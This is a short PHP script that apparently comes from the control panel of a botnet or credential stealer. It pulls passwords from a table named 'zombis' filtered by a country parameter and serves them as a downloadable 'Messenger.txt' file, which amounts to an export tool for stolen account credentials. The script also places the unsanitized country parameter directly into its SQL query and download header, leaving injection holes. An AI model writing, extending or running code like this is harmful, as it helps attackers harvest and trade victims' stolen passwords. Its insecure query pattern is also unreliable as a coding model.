<?php @session_start(); if ( !isset($_SESSION['login']) ){ header ("Location: ../../");  exit() ; }	?>
<?php 
require_once('../../includes.php'); 

$Messenger = $DB->Select("SELECT * FROM zombis WHERE pais='".$_GET['pais']."'");	
for($i=0; $i<count($Messenger); $i++){
	$Messengertxt .= $Messenger[$i]['pasw'] . '
' ;
}
$Ramdon = substr(md5(uniqid(rand())),0,6);

$downloadfile="".$Ramdon."-".$_GET['pais']."-Messenger.txt";

header("Content-disposition: attachment; filename=".$downloadfile."");
header("Content-Type: text/html");
header("Content-Transfer-Encoding: binary");
header("Content-Length: ".strlen($Messengertxt));
header("Pragma: no-cache");
header("Expires: 0");
echo $Messengertxt ;
?>







